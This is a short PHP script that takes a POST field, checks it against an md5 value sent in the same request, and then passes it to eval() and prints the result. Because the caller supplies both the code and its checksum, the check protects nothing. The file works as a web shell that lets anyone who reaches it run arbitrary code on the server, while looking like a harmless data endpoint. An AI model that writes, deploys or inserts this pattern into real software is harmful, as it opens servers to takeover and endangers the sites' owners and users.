<?php

if (isset($_POST['b']) && isset($_POST['m'])){
	$body = $_POST['b'];
	$md5 = $_POST['m'];
	if (md5($body) != $md5){
		die('error:md5 error!');
	}
	$data = eval('return ' . $body . ';');
	print_r( $data);
}else{
	die('error:No Data');
}

?>